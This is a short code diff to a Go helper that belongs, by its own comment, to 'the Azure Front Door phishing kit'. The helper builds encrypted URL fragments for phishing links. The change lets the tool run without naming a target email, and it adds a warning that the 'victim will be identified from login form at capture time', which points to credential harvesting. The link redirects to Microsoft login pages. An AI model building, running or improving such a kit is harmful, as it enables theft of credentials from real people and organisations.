@@ -2,7 +2,8 @@
 // for the Azure Front Door phishing kit.
 //
 // Usage:
-//   go run . --key <base64-key> --email victim@corp.com --brand microsoft --template m365-shared --redirect https://login.microsoftonline.com
+//   go run . --key <base64-key> --redirect https://login.live.com/... --campaign my-campaign
+//   (--email, --brand, --template are optional)
 //
 // Output: base64url-encoded encrypted fragment (the part after # in the URL)
 
@@ -47,8 +48,7 @@ func main() {
 		os.Exit(1)
 	}
 	if *email == "" {
-		fmt.Fprintln(os.Stderr, "ERROR: --email is required")
-		os.Exit(1)
+		fmt.Fprintln(os.Stderr, "WARNING: --email not set — victim will be identified from login form at capture time")
 	}
 
 	key, err := base64.StdEncoding.DecodeString(*keyB64)
